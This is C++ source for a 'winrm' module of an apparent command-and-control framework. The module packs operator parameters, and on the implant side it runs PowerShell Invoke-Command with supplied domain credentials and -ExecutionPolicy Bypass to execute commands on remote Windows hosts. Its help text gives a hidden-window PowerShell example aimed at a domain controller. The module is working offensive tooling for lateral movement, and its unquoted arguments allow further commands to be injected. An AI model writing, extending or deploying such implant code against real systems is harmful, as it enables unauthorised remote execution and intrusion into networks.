#include "WinRM.hpp"

#include "Common.hpp"

#include <sstream>
#include <algorithm>

#ifdef _WIN32
#include <windows.h>
#include <cstdio>
#endif

using namespace std;

constexpr std::string_view moduleNameWinRM = "winrm";
constexpr unsigned long long moduleHashWinRM = djb2(moduleNameWinRM);

#ifdef _WIN32
extern "C" __declspec(dllexport) WinRM* WinRMConstructor()
{
    return new WinRM();
}
#else
extern "C" __attribute__((visibility("default"))) WinRM* WinRMConstructor()
{
    return new WinRM();
}
#endif

WinRM::WinRM()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleNameWinRM), moduleHashWinRM)
#else
    : ModuleCmd("", moduleHashWinRM)
#endif
{
}

WinRM::~WinRM() = default;

std::string WinRM::getInfo()
{
    std::ostringstream oss;
#ifdef BUILD_TEAMSERVER
    oss << "WinRM / PowerShell Remoting Module:\n";
    oss << "Execute commands remotely over WS-Man using PowerShell remoting." << '\n';
    oss << "Options:" << '\n';
    oss << "  -e <endpoint>        Remote host or URL (host defaults to http://<host>:5985/wsman)." << '\n';
    oss << "  -c <command>         Command to execute." << '\n';
    oss << "  -a <arguments>       Arguments passed to the command." << '\n';
    oss << "  -u <user>            DOMAIN\\user credentials." << '\n';
    oss << "  -p <password>        Password for the credential." << '\n';
    oss << "  --https              Use HTTPS (port 5986)." << '\n';
    oss << "Example:" << '\n';
    oss << "  winrm -e dc01.contoso.local -c powershell.exe -a \"-nop -w hidden -c Get-Process\"" << '\n';
#endif
    return oss.str();
}

std::string WinRM::packParameters(const Parameters& params) const
{
    std::string packed;
    auto append = [&packed](const std::string& value)
    {
        packed.append(value);
        packed.push_back('\0');
    };

    append(params.endpoint);
    append(params.command);
    append(params.arguments);
    append(params.username);
    append(params.password);
    append(params.useHttps ? "1" : "0");
    return packed;
}

WinRM::Parameters WinRM::unpackParameters(const std::string& data) const
{
    Parameters params;
    std::vector<std::string> parts;
    size_t start = 0;
    while (start < data.size())
    {
        size_t end = data.find('\0', start);
        if (end == std::string::npos)
        {
            break;
        }
        parts.emplace_back(data.substr(start, end - start));
        start = end + 1;
    }

    if (parts.size() < 6)
    {
        return params;
    }

    params.endpoint = parts[0];
    params.command = parts[1];
    params.arguments = parts[2];
    params.username = parts[3];
    params.password = parts[4];
    params.useHttps = parts[5] == "1";
    return params;
}

int WinRM::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    std::vector<std::string> args = regroupStrings(splitedCmd);
    Parameters params;

    if (args.size() < 2)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    for (size_t i = 1; i < args.size(); ++i)
    {
        const std::string& current = args[i];
        if (current == "-e" && i + 1 < args.size())
        {
            params.endpoint = args[++i];
        }
        else if (current == "-c" && i + 1 < args.size())
        {
            params.command = args[++i];
        }
        else if (current == "-a" && i + 1 < args.size())
        {
            params.arguments = args[++i];
        }
        else if (current == "-u" && i + 1 < args.size())
        {
            params.username = args[++i];
        }
        else if (current == "-p" && i + 1 < args.size())
        {
            params.password = args[++i];
        }
        else if (current == "--https")
        {
            params.useHttps = true;
        }
        else if (!current.empty() && current[0] != '-')
        {
            if (params.endpoint.empty())
            {
                params.endpoint = current;
            }
            else if (params.command.empty())
            {
                params.command = current;
            }
            else if (params.arguments.empty())
            {
                params.arguments = current;
            }
        }
    }

    if (params.endpoint.empty() || params.command.empty())
    {
        c2Message.set_returnvalue("Missing endpoint or command.\n" + getInfo());
        return -1;
    }

    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd(packParameters(params));
#endif
    return 0;
}

int WinRM::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    Parameters params = unpackParameters(c2Message.cmd());
    std::string result;

#ifdef _WIN32
    result = runCommand(params);
#else
    (void)params;
    result = "WinRM module is only supported on Windows.\n";
#endif

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(c2Message.cmd());
    c2RetMessage.set_returnvalue(result);
    return 0;
}

int WinRM::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
    errorMsg = c2RetMessage.returnvalue();
    return 0;
}

#ifdef _WIN32
namespace
{
    std::string escapeSingleQuotes(const std::string& input)
    {
        std::string escaped;
        escaped.reserve(input.size() * 2);
        for (char ch : input)
        {
            escaped.push_back(ch);
            if (ch == '\'')
            {
                escaped.push_back('\'');
            }
        }
        return escaped;
    }

    std::string buildEndpoint(const WinRM::Parameters& params)
    {
        if (params.endpoint.rfind("http://", 0) == 0 || params.endpoint.rfind("https://", 0) == 0)
        {
            return params.endpoint;
        }

        std::ostringstream oss;
        oss << (params.useHttps ? "https://" : "http://");
        oss << params.endpoint;
        oss << (params.useHttps ? ":5986/wsman" : ":5985/wsman");
        return oss.str();
    }
}

std::string WinRM::runCommand(const Parameters& params) const
{
    std::ostringstream output;

    std::string endpoint = buildEndpoint(params);
    std::string escapedCommand = escapeSingleQuotes(params.command);
    std::string escapedArgs = escapeSingleQuotes(params.arguments);

    std::ostringstream script;
    if (!params.username.empty())
    {
        script << "$secure = ConvertTo-SecureString '" << escapeSingleQuotes(params.password) << "' -AsPlainText -Force;";
        script << "$cred = New-Object System.Management.Automation.PSCredential('" << escapeSingleQuotes(params.username) << "',$secure);";
        script << "Invoke-Command -ConnectionUri $uri -Credential $cred -Authentication Negotiate ";
    }
    else
    {
        script << "Invoke-Command -ConnectionUri $uri ";
    }
    script << "-ScriptBlock { & '" << escapedCommand << "'";
    if (!params.arguments.empty())
    {
        script << " " << escapedArgs;
    }
    script << " }";

    std::ostringstream powershell;
    powershell << "powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"";
    powershell << "$uri='" << endpoint << "';";
    powershell << script.str();
    powershell << "\"";

    FILE* pipe = _popen(powershell.str().c_str(), "rt");
    if (!pipe)
    {
        return "Failed to launch PowerShell for WinRM execution.\n";
    }

    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe))
    {
        output << buffer;
    }
    _pclose(pipe);

    std::string result = output.str();
    if (result.empty())
    {
        result = "Command executed with no output.\n";
    }
    return result;
}
#endif
